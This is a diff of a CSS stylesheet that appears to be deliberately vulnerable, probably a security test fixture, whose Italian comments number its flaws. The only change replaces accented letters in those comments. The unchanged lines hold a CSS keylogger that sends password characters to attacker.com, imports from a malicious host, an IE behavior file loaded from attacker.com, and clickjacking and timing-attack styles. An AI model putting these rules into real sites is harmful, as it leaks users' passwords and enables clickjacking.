@@ -33,14 +33,14 @@
  */
 
 /*  VULNERABILITA' #3: CSS Injection vulnerability */
-/* Questo selettore può essere sfruttato per CSS injection se user input non sanitizzato */
+/* Questo selettore puo' essere sfruttato per CSS injection se user input non sanitizzato */
 [data-user-input*=""] {
     /* Potenziale CSS injection se attributo popolato con input utente */
     background: var(--user-controlled-value);
 }
 
 /*  VULNERABILITA' #4: Keylogger via CSS (attribute selector attack) */
-/* Può essere usato per estrarre caratteri di password */
+/* Puo' essere usato per estrarre caratteri di password */
 input[type="password"][value^="a"] { background: url("http://attacker.com/log?char=a"); }
 input[type="password"][value^="b"] { background: url("http://attacker.com/log?char=b"); }
 input[type="password"][value^="c"] { background: url("http://attacker.com/log?char=c"); }
@@ -70,7 +70,7 @@ input[name="ssn"][value^="1"] {
 
 /*  VULNERABILITA' #7: Clickjacking helper styles */
 .hidden-overlay {
-    /* Può essere usato per overlay invisibili in clickjacking attacks */
+    /* Puo' essere usato per overlay invisibili in clickjacking attacks */
     opacity: 0;
     position: absolute;
     top: 0;
@@ -96,7 +96,7 @@ body {
 
 /*  VULNERABILITA' #9: CSS Injection point per Unicode tricks */
 .user-content::before {
-    /* Se content viene da user input, può contenere Unicode tricks */
+    /* Se content viene da user input, puo' contenere Unicode tricks */
     content: attr(data-user-content);
     /* Potenziale per homograph attacks o rendering tricks */
 }
@@ -135,7 +135,7 @@ body {
 
 /*  VULNERABILITA' #13: Sourcemap disclosure */
 /*# sourceMappingURL=styles.css.map */
-/* Il sourcemap può contenere path interni, variabili, commenti originali */
+/* Il sourcemap puo' contenere path interni, variabili, commenti originali */
 
 /*  VULNERABILITA' #14: @import da fonte non verificata */
 @import url('http://malicious-styles.com/inject.css');
@@ -160,7 +160,7 @@ body {
 
 /*  VULNERABILITA' #17: Behavior binding (IE specific) */
 .ie-behavior-vuln {
-    /* IE specific - può caricare ed eseguire file .htc */
+    /* IE specific - puo' caricare ed eseguire file .htc */
     behavior: url('http://attacker.com/malicious.htc');
 }
 
@@ -183,7 +183,7 @@ body {
 
 /*  VULNERABILITA' #20: CSS timing attacks */
 .timing-attack-vector {
-    /* Può essere usato per timing attacks su CSS */
+    /* Puo' essere usato per timing attacks su CSS */
     animation: leak 9999s;
     animation-delay: calc(1s * var(--secret-value));
 }
@@ -200,7 +200,7 @@ body {
 
 /*  VULNERABILITA' #22: Viewport-based information disclosure */
 @media (max-width: 1024px) {
-    /* Rivela dimensione viewport - può essere usato per fingerprinting */
+    /* Rivela dimensione viewport - puo' essere usato per fingerprinting */
     body::after {
         content: "Desktop detected";
         display: none; /* Ma fa comunque richiesta background */
@@ -237,7 +237,7 @@ body {
 /*  VULNERABILITA' #25: CSS-based CAPTCHA bypass hints */
 .captcha-answer {
     /* Classi che rivelano risposta CAPTCHA */
-    /* In combinazione con CSS selectors, può rivelare caratteri */
+    /* In combinazione con CSS selectors, puo' rivelare caratteri */
 }
 
 .captcha-char-a { /* Carattere A presente nel CAPTCHA */ }
